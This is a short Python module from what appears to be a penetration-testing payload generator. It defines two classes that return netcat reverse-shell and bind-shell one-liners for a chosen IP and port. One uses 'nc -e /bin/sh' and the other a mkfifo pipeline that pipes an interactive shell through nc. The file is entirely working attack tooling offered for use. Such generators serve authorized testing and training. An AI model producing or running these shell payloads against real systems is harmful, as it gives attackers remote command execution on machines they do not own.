"""
Netcat reverse and bind shell payload generators.

Author: Mostafa Tamime
"""

from generators.base import PayloadGenerator


class NetcatGenerator(PayloadGenerator):
    """Traditional netcat -e reverse/bind shells (OpenBSD nc without -e needs mkfifo)."""

    def reverse(self, ip: str, port: int) -> str:
        return f"nc -e /bin/sh {ip} {port}"

    def bind(self, port: int) -> str:
        return f"nc -e /bin/sh -l -p {port}"

    def file_extension(self) -> str:
        return ".sh"


class NetcatMkfifoGenerator(PayloadGenerator):
    """Netcat reverse/bind shells using mkfifo (works without -e)."""

    def reverse(self, ip: str, port: int) -> str:
        return (
            f"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {ip} {port} >/tmp/f"
        )

    def bind(self, port: int) -> str:
        return (
            f"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|"
            f"nc -l -p {port} >/tmp/f"
        )

    def file_extension(self) -> str:
        return ".sh"
